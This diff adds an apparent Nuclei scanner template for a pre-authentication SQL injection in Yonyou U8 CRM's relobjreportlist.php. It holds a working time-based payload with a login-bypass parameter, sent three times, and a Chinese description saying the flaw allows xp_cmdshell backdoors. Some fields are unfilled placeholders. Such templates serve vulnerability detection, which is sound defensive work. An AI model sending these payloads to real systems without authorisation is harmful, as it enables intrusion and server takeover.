@@ -1,0 +1,42 @@
+id: yongyou-u8-crm-relobjreportlist-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 用友U8 CRM 客户关系管理系统 config/relobjreportlist.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /config/relobjreportlist.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Length: 87
+
+        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--
+      - |-
+        POST /config/relobjreportlist.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Length: 87
+
+        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--
+      - |-
+        POST /config/relobjreportlist.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+        Content-Length: 87
+
+        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
